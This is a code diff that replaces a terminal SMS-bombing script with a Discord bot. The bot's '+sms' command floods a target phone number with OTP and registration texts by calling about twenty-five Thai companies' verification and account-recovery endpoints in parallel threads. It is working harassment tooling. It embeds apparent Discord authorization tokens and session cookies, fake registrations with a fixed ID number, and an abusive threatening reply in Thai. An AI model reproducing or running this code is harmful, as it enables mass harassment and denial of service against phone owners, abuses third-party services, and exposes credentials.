@@ -1,89 +1,250 @@
+import discord,time
 import requests
-import time,os,sys
-import random
+from requests import post,Session
+from concurrent.futures import ThreadPoolExecutor
+from discord.ext import commands
+from re import search
 import threading
-import pyfiglet
 
-os.system("clear")
+token = "OTQzNDEzNzc3NjAzMzc5MjUx.YgysjA.Vk-VTBhTWcaF86MXI5FPXPW3jZc"
 
-print("")
 
-ascii_banner = pyfiglet.figlet_format(" phuwanai")
-print(f"\033[1;91m{ascii_banner}")
-print("")
-print("                 \033[1;96m         FACEBOOK : มน ผู้กำเนิดพระเจ้า")
-print("\033[0m                          ****************************")
-print("")
-phone = input("\033[1;96mNummon-killer : \033[1;95m")
-jam = int(input("\033[1;96mNUMBER-ATTACK : \033[1;95m"))
-print("")
 
-def api1():
- requests.post("https://kaspy.com/sms/sms.php/",data=f"phone={phone}",headers={"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8","User-Agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","Cookie": "PHPSESSID=2i484jdb1pie5am071cveupme5; mage-cache-storage=%7B%7D; mage-cache-storage-section-invalidation=%7B%7D; mage-cache-sessid=true; form_key=rUt4Q17TiRlUfgKz; _ga=GA1.2.1486915122.1646803642; _gid=GA1.2.1348564830.1646803642; _fbp=fb.1.1646803643605.1538052508; mage-messages=; recently_viewed_product=%7B%7D; recently_viewed_product_previous=%7B%7D; recently_compared_product=%7B%7D; recently_compared_product_previous=%7B%7D; product_data_storage=%7B%7D; smartbanner_exited=1; __atuvc=2%7C10; __atuvs=62283aaa77850300001; _gat=1; private_content_version=382c8a313cac3cd587475c1b3693672e; section_data_ids=%7B%22cart%22%3A1646803701%2C%22customer%22%3A1646803701%2C%22compare-products%22%3A1646803701%2C%22last-ordered-items%22%3A1646803701%2C%22directory-data%22%3A1646803701%2C%22captcha%22%3A1646803701%2C%22instant-purchase%22%3A1646803701%2C%22persistent%22%3A1646803701%2C%22review%22%3A1646803701%2C%22wishlist%22%3A1646803701%2C%22chatData%22%3A1646803701%2C%22recently_viewed_product%22%3A1646803701%2C%22recently_compared_product%22%3A1646803701%2C%22product_data_storage%22%3A1646803701%2C%22paypal-billing-agreement%22%3A1646803701%2C%22messages%22%3A1646803708%7D"})
- print(f"\033[1;91m {phone} ส่งOTP " + str(random.randint(1000,9999)))
- 
-def api2():
- requests.get(f"https://www.scgexpress.co.th/member/getRegister?phone={phone}")
- print(f"\033[1;91m {phone} ส่งOTP " + str(random.randint(1000,9999)))
- 
-def api3():
- requests.post('https://www.sso.go.th/wpr/MEM/terminal/ajax_send_otp',headers = {"User-Agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","Content-Type": "application/x-www-form-urlencoded; charset=UTF-8","X-Requested-With": "XMLHttpRequest","Cookie": "sso_local_storeci_sessions=KHj9a18RowgHYWbh71T2%2FDFAcuC2%2FQaJkguD3MQ1eh%2FlwrUXvpAjJgrm6QKAja4oe7rglht%2BzO6oqblJ4EMJF4pqnY%2BGtR%2F0RzIFGN0Suh1DJVRCMPpP8QtZsF5yDyw6ibCMf2HXs95LvAMi7KUkIeaWkSahmh5f%2F3%2FqcOQ2OW5yakrMGA1mJ5upBZiUdEYNmxUAljcqrg7P3L%2BGAXxxC2u1bO09Oz4qf4ZV9ShO0gz5p5CbkE7VxIq1KUrEavn9Y%2BarQmsh1qIIc51uvCev1U1uyXfC%2F9U7uRl7x%2FVYZYT2pkLd3Q7qnZoSNBL8y9wge8Lt7grySdVLFhw9HB68dTSiOm1K04QhdrprI7EsTLWDHTgYmgyTQDuz63YjHsH5MUVanlfBISU1WXmRTXMKbUjlcl0LPPYUR9KWzrVL7sXcrCX%2FfUwLJIU%2F7MTtDYUx39y1CAREM%2F8dw7AEjcJAOA%3D%3D684b65b9b9dc33a3380c5b121b6c2b3ecb6f1bec; PHPSESSID=1s2rdo0664qpg4oteil3hhn3v2; TS01ac2b25=01584aa399fbfcc6474d383fdc1405e05eaa529fa33e596e5189664eb7dfefe57b927d8801ad40fba49f0adec4ce717dd5eabf08d7080e2b85f34368a92a47e71ef07861a287c40da15c0688649509d7f97eb2c293; _ga=GA1.3.1824294570.1636876684; _gid=GA1.3.1832635291.1636876684"},data=f"dCard=1358231116147&Mobile={phone}&password=098098Az&repassword=098098Az&perPrefix=Mr.&cn=Dhdhhs&sn=Vssbsh&perBirthday=5&perBirthmonth=5&perBirthyear=2545&Email=nickytom5879%40gmail.com&otp_type=OTP&otpvalue=&messageId=REGISTER")
- print(f"\033[1;91m {phone} ส่งOTP " + str(random.randint(1000,9999)))
- 
-def api4():
- requests.post("https://www.instagram.com/accounts/account_recovery_send_ajax/",data=f"email_or_username={phone}&recaptcha_challenge_field=",headers={"Content-Type":"application/x-www-form-urlencoded","X-Requested-With":"XMLHttpRequest","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.116 Safari/537.36","x-csrftoken": "EKIzZefCrMss0ypkr2VjEWZ1I7uvJ9BD"}).json
- print(f"\033[1;91m {phone} ส่งOTP " + str(random.randint(1000,9999)))
- 
-def api5():
- requests.post("https://user-api.learn.co.th/authentication/sendOTP",json={"mobileNumber": f"{phone}"},headers={"user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","Host": "user-api.learn.co.th","content-length": "29","sec-ch-ua-mobile": "?1","content-type": "application/json;charset=UTF-8","accept": "application/json, text/plain, */*","sec-ch-ua-platform": "Android","origin": "https://user.learn.co.th","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://user.learn.co.th/","x-api-key": "USER_API_KEY"})
- print(f"\033[1;91m {phone} ส่งOTP " + str(random.randint(1000,9999)))
- 
-def api6():
- requests.post("https://www.msport1688.com/auth/send_otp", data={"phone":phone})
- print(f"\033[1;91m {phone} ส่งOTP " + str(random.randint(1000,9999)))
- 
-def api7():
- requests.post("https://api.true-shopping.com/customer/api/request-activate/mobile_no", data={"username": phone})
- print(f"\033[1;91m {phone} ส่งOTP " + str(random.randint(1000,9999)))
- 
-def api8():
- requests.post("http://b226.com/x/code", data={f"phone":phone})
- print(f"\033[1;91m {phone} ส่งOTP " + str(random.randint(1000,9999)))
+prefix = "+"
 
-def api9():
- print(f"\033[1;91m {phone} ส่งOTP " + str(random.randint(1000,9999)))
- requests.post("https://topping.truemoveh.com/api/get_request_otp", data=f"mobile_number={phone}",headers={
-    "Accept": "application/json, text/plain, /",
-    "User-Agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",
-    "Content-Type": "application/x-www-form-urlencoded",
-    "Referer": "https://topping.truemoveh.com/otp?callback=/campaign/104",
-    "Cookie": "_ga=GA1.2.1205060554.1640098569; _gcl_au=1.1.1987856152.1640098570; wisepops=%7B%22csd%22%3A1%2C%22popups%22%3A%7B%7D%2C%22sub%22%3A0%2C%22ucrn%22%3A57%2C%22cid%22%3A%2237257%22%2C%22v%22%3A4%2C%22bandit%22%3A%7B%22recos%22%3A%7B%7D%7D%7D; wisepops_props=%7B%22userType%22%3A%22non-true%22%7D; _fbp=fb.1.1640098573194.360235747; wisp-https%3A%2F%2Fapp.getwisp.co-Ly7y=88ce9a24-a734-4ee0-a698-20f8eddb4942; _gac_UA-34289891-14=1.1640601367.Cj0KCQiA5aWOBhDMARIsAIXLlkfb9M64-nkR8u0vdLiqqAhHzV1TK-wuYhvA4nvc76GLMd_LvbDYizMaAruSEALw_wcB; ci_session=dbskqg6a8lqknf9n1cep0jb5vrrhkqdi; AWSELB=87C963610CC5C30592B0F71CAEE836AADF65AFF7868D84BE668BFDE38423D810F8497FAC88813163C52320060AF1A0D59D6D0AECF99D0389471FA83C1B90863201109E903015CCAF2CCBA3F11A5EDD799554400EE1; _gid=GA1.2.1638141276.1641466031; _gac_UA-41231050-25=1.1641466031.Cj0KCQiAw9qOBhC-ARIsAG-rdn5KaPC2N06d1nss7arDQn6S0_lOmvX71l8LKwV__iZpWisXEem-EP8aAjF2EALw_wcB; _gat=1; _gcl_aw=GCL.1641466031.Cj0KCQiAw9qOBhC-ARIsAG-rdn5KaPC2N06d1nss7arDQn6S0_lOmvX71l8LKwV__iZpWisXEem-EP8aAjF2EALw_wcB; _gcl_dc=GCL.1641466031.Cj0KCQiAw9qOBhC-ARIsAG-rdn5KaPC2N06d1nss7arDQn6S0_lOmvX71l8LKwV__iZpWisXEem-EP8aAjF2EALw_wcB; _gat_UA-41231050-25=1; wisepops_visits=%5B%222022-01-06T10%3A47%3A11.626Z%22%2C%222022-01-04T16%3A54%3A03.887Z%22%2C%222021-12-28T10%3A38%3A18.612Z%22%2C%222021-12-28T10%3A38%3A04.394Z%22%2C%222021-12-28T10%3A37%3A40.387Z%22%2C%222021-12-27T03%3A47%3A11.187Z%22%2C%222021-12-25T12%3A27%3A55.196Z%22%2C%222021-12-23T17%3A48%3A39.146Z%22%2C%222021-12-21T17%3A56%3A55.678Z%22%2C%222021-12-21T15%3A06%3A46.971Z%22%5D; wisepops_session=%7B%22arrivalOnSite%22%3A%222022-01-06T10%3A47%3A11.626Z%22%2C%22mtime%22%3A1641466036863%2C%22pageviews%22%3A2%2C%22popups%22%3A%7B%7D%2C%22bars%22%3A%7B%7D%2C%22countdowns%22%3A%7B%7D%2C%22src%22%3A%22https%3A%2F%2Fwww.google.com%2F%22%2C%22utm%22%3A%7B%22gclid%22%3A%22yes%22%7D%2C%22testIp%22%3Anull%7D"})
+bot = commands.Bot(command_prefix=prefix,help_command=None)
+threading = ThreadPoolExecutor(max_workers=int(100000000))
+useragent = "Mozilla/5.0 (Linux; Android 11; V2043) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36"
+def cang01(phone):
+    post("https://partner-api.grab.com/grabid/v1/oauth2/otp", headers={"User-Agent": useragent}, json={"client_id":"4ddf78ade8324462988fec5bfc5874c2","transaction_ctx":"null","country_code":"TH","method":"SMS","num_digits":"6","scope":"openid profile.read foodweb.order foodweb.rewards foodweb.get_enterprise_profile","phone_number": f"66{phone[1:]}"})
+def cang02(phone):
+    post(f"http://m.vcanbuy.com/gateway/msg/send_regist_sms_captcha?mobile=66-0{phone}")
     
-def api10():
- headers = {
-        "content-type": "application/x-www-form-urlencoded",
-        "user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",
-        "referer": "https://www.wongnai.com/guest2?_f=signUp&guest_signup_type=phone",
-        "cookie": "_gcl_au=1.1.1123274548.1637746846"
-        }
- requests.post("https://www.wongnai.com/_api/guest.json?_v=6.054&locale=th&_a=phoneLogIn",headers=headers,data=f"phoneno={phone}&retrycount=0")
- print(f"\033[1;91m {phone} ส่งOTP " + str(random.randint(1000,9999)))
+def cang03(phone):
+    post("https://nocnoc.com/authentication-service/user/OTP?b-uid=1.0.661", headers={"User-Agent": useragent}, json={"lang":"th","userType":"BUYER","locale":"th","orgIdfier":"scg","phone": f"+66{phone[1:]}","type":"signup","otpTemplate":"buyer_signup_otp_message","userParams":{"buyerName": "dec"}})
+   
+   
+def cang1(phone):
+    post("https://cognito-idp.ap-southeast-1.amazonaws.com/",headers={"cache-control": "max-age=0","user-agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","content-type": "application/x-amz-json-1.1","x-amz-target": "AWSCognitoIdentityProviderService.ResendConfirmationCode","x-amz-user-agent": "aws-amplify/0.1.x js","referer": "https://www.bugaboo.tv/members/resetpass/phone"},json={"ClientId":"6g47av6ddfcvi06v4l186c16d6","Username":f"+66{phone[1:]}"})
+    
+    
+def cang2(phone):
+    post("https://www.carsome.co.th/website/login/sendSMS",json={"username":phone,"optType":0})
+    
+def cang3(phone):
+    post("https://the1web-api.the1.co.th/api/t1p/regis/requestOTP",json={
+  "on": {
+    "value": phone,
+    "country": "66"
+  },
+  "type": "mobile"
+},headers={"accept":"application/json, text/plain, */*","user-agent":"Mozilla/5.0 (Linux; Android 11; V2043) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36","content-type":"application/json;charset=UTF-8"}) 
 
-def api11():
- requests.post("https://the1web-api.the1.co.th/api/t1p/regis/requestOTP", json={"on":{"value":phone,"country":"66"},"type":"mobile"})
- print(f"\033[1;91m {phone} ส่งOTP " + str(random.randint(1000,9999)))
+
+def cang4(phone):
+    post("https://ecomapi.eveandboy.com/v10/user/signup/phone", data={"phone": f"{phone[1:]}","password":"123456789Az"})
+    
+    
+def cang5(phone):
+    post("https://gccircularlivingshop.com/sms/sendOtp", json={"grant_type":"otp","username": "+66"+phone,"password":"","client":"ecommerce"})
+    
+def cang6(phone):
+    post("https://the1web-api.the1.co.th/api/t1p/regis/requestOTP", json={"on":{"value": phone,"country":"66"},"type":"mobile"})
+
+def cang7(phone):
+    post("https://m.lucabet168.com/api/register-otp",json={"brands_id":"609caede5a67e5001164b89d","agent_register":"60a22f7d233d2900110070d7","tel": phone})
+    
+def cang8(phone):
+    post("https://store.boots.co.th/api/v1/guest/register/otp",json={"phone_number": phone})
+    
  
-def api12(): 
- requests.post("https://vaccine.trueid.net/vacc-verify/api/getotp",json={"msisdn":phone,"function":"enroll"},headers={"user-agent":"Mozilla/5.0 (Linux; Android 11; V2043) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36"})
- print(f"\033[1;91m {phone} ส่งOTP " + str(random.randint(1000,9999)))
+    
+def cang9(phone):
+    post("https://m.lavagame168.com/api/register-otp",headers={"x-exp-signature": "5ffc0caa4d603200124e4eb1","user-agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","referer": "https://m.lavagame168.com/dashboard/login"},json={"brands_id":"5ffc0caa4d603200124e4eb1","agent_register":"5ffc0d5cdcd4f30012aec3d9","tel": phone})
+    
+def cang10(phone):
+    post("https://ep789bet.net/auth/send_otp", data={"phone":f"{phone}"})
+    
+def cang11(phone):
+    post("https://api2.1112.com/api/v1/otp/create",json={"phonenumber":phone,
+        "language": "th"},headers={"accept": "application/json, text/plain, /",
+	    "user-agent": "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"})
+    
+    
+    
+    
+def cang12(phone):
+	post("https://discord.com/api/v9/users/@me/phone",json={
+  "phone": "+66"+phone,
+  "change_phone_reason": "guild_phone_required"
+},headers={"authorization":"OTA4MjA2NjE4NjE1OTA2Mzg1.Ycz2Hw.TdQLC2lIwn6UQDl1xBsyJGLnjOw"})
+
+
+def cang13(phone):
+	post("https://www.konvy.com/ajax/system.php?type=reg&action=get_phone_code", headers={"User-Agent": useragent}, data={"phone": phone})
+
+
+def cang13(phone):
+	post("https://api.scg-id.com/api/otp/send_otp", headers={"User-Agent": useragent, "Content-Type": "application/json;charset=UTF-8"},json={"phone_no": phone})
+	
+
+def cang14(phone):
+	post(f"https://th.kerryexpress.com/website-api/api/OTP/v1/RequestOTP/{phone}", headers={"User-Agent": useragent})
+	
+def cang15(phone):
+	post("https://www.wongnai.com/_api/guest.json?_v=6.056&locale=th&_a=phoneLogIn",data={"phoneno":phone,
+
+"retrycount":"0"
+
+    },headers={"user-agent":"Mozilla/5.0 (Linux; Android 11; V2043) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36"})
+    
+def cang16(phone):
+    post("https://ocs-prod-api.makroclick.com/next-ocs-member/user/register",json={"username":phone,"password":"1111a1111A","name":phone,"provinceCode":"74","districtCode":"970","subdistrictCode":"8654","zipcode":"94140","siebelCustomerTypeId":"710","locale":"th_TH"},headers={"user-agent":"Mozilla/5.0 (Linux; Android 11; V2043) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36"})
+    
+def cang17(phone):
+    session = Session()
+    searchItem = session.get("https://www.shopat24.com/register/").text
+    ReqTOKEN = search("""<input type="hidden" name="_csrf" value="(.*)" />""", searchItem).group(1)
+    session.post("https://www.shopat24.com/register/ajax/requestotp/", headers={"User-Agent": useragent, "content-type": "application/x-www-form-urlencoded; charset=UTF-8","X-CSRF-TOKEN": ReqTOKEN}, data={"phoneNumber": phone})
+     
+     
+def cang18(phone):
+    session = Session()
+    ReqTOKEN = session.get("https://srfng.ais.co.th/Lt6YyRR2Vvz%2B%2F6MNG9xQvVTU0rmMQ5snCwKRaK6rpTruhM%2BDAzuhRQ%3D%3D?redirect_uri=https%3A%2F%2Faisplay.ais.co.th%2Fportal%2Fcallback%2Ffungus%2Fany&httpGenerate=generated", headers={"User-Agent": useragent}).text
+    session.post("https://srfng.ais.co.th/login/sendOneTimePW", data=f"msisdn=66{phone[1:]}&serviceId=AISPlay&accountType=all&otpChannel=sms",headers={"User-Agent": useragent,"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "authorization": f'''Bearer {search("""<input type="hidden" id='token' value="(.*)">""", ReqTOKEN).group(1)}'''})
+    
+    
+
+def sck(sphone):
+    post("https://ocs-prod-api.makroclick.com/next-ocs-member/user/register",json={"username":sphone,"password":"1111a1111A","name":sphone,"provinceCode":"74","districtCode":"970","subdistrictCode":"8654","zipcode":"94140","siebelCustomerTypeId":"710","locale":"th_TH"},headers={"user-agent":"Mozilla/5.0 (Linux; Android 11; V2043) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36"})
+    
+def cang19(phone):
+		post("https://vaccine.trueid.net/vacc-verify/api/getotp",json={"msisdn":phone,"function":"enroll"},headers={"user-agent":"Mozilla/5.0 (Linux; Android 11; V2043) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36"})
+    
+    
+def cang20(phone):
+	post("https://topping.truemoveh.com/api/get_request_otp",data={"mobile_number": phone,
+	})
+
+	
+def cang21(phone):
+	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
+
+    
+def cang22(phone):
+	requests.get("https://api.quickcash8.com/v1/login/captcha?timestamp=1636359633&sign=3a11b88fbf58615099d15639e714afcc&token=&version=2.3.2&appsFlyerId=1636346593405-2457389151564256014&platform=android&channel_str=&phone="+phone+"&img_code=", headers = {"Host": "api.quickcash8.com", "Connection": "Keep-Alive", "Accept": "gzip", "User-Agent": "okhttp/3.11.0"})
+	
+def cang23(phone):
+	 requests.get("https://www.baanandbeyond.com/registration_initiate?on%5Bcountry%5D=66&on%5Bvalue%5D="+phone+"&type=mobile")
+	 
+def cang24(phone):
+	requests.get("https://findclone.ru/register?phone=+66"+phone)
+
+    
+    
  
-def api13():
- requests.post("https://bkgame.bet/env/authen.php?requestotp", data=f"phone_number={phone}",headers={"content-type": "application/x-www-form-urlencoded","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36"})
- print(f"\033[1;91m {phone} ส่งOTP " + str(random.randint(1000,9999)))
- 
-def api14():
- requests.get(f"https://findclone.ru/register?phone=+66{phone[1:]}",headers={"X-Requested-With" : "XMLHttpRequest","User-Agent" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.116 Safari/537.36"}).json()
- print(f"\033[1;91m {phone} ส่งOTP " + str(random.randint(1000,9999)))
- 
-def api15():
- requests.post("https://prettygaming168-api.auto888.cloud/api/v3/otp/send", data = {"tel":phone,"otp_type":"register"}, headers = {"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win6
+    
+def BBot(phone, amount):
+    for i in range(amount):
+       
+        
+        
+        
+        threading.submit(cang01,phone)
+        threading.submit(cang02,phone)
+        threading.submit(cang03,phone)
+        threading.submit(cang1,phone)
+        threading.submit(cang2,phone)
+        threading.submit(cang3,phone)
+        threading.submit(cang3,phone)
+        threading.submit(cang4,phone)
+        threading.submit(cang5,phone)
+        threading.submit(cang6,phone)
+        threading.submit(cang7,phone)
+        threading.submit(cang8,phone)
+        threading.submit(cang9,phone)
+        threading.submit(cang10,phone)
+        threading.submit(cang11,phone)
+        threading.submit(cang12,phone)
+        threading.submit(cang13,phone)
+        threading.submit(cang14,phone)
+        threading.submit(cang15,phone)
+        threading.submit(cang16,phone)
+        threading.submit(cang17,phone)
+        threading.submit(cang18,phone)
+        threading.submit(cang19,phone)
+        threading.submit(cang20,phone)        
+        threading.submit(cang21,phone)
+        threading.submit(cang22,phone)
+        threading.submit(cang23,phone)
+        threading.submit(cang24,phone)
+        
+        
+        
+        
+        
+
+
+        
+       
+        
+        
+        
+@bot.event
+async def on_connect():
+    print(f"กำลังล็อกอินบอท : {bot.user}")
+    time.sleep(1.0)
+    print("ล็อกอินสำเร็จ")
+    
+
+
+    
+
+
+    
+    
+    
+@bot.command()
+async def sms(ctx, phone, amount:int):
+    
+    if (amount < 151):
+    	
+      embes = discord.Embed(title="SMS BOT", description="Bot by : Victor#0001",color=0xff4612)
+      embes.add_field(name="กำลังยิงไปที่เบอร์",value=phone)
+      ima = "https://phoneky.co.uk/thumbs/screensavers/down/technology/smsisloadi_aleaqts4.gif"
+      embes.set_image(url=ima)
+    
+      await ctx.channel.send(embed=embes)
+    
+		
+    
+      BBot(phone,amount)
+    else:
+    	await ctx.channel.send("กูบอกว่ายิงไม่เกิน150ไง ไอสัสพวกเหี้ย กูฆ่ามืงแน่")
+    
+
+
+		
+		
+		
+		
+		
+
+
+	
+	
+    
+    
+    
+    
+@bot.command()
+async def help(ctx):
+	emBed = discord.Embed(title="Bot BY: Hee",description="วิธิใช้",color=0xff4612)
+	emBed.add_field(name="#_#",value="+sms [เบอร์] [จำนวน]")
+	
+	
+	await ctx.channel.send(embed=emBed)
+    
+    
+    
+bot.run(token)
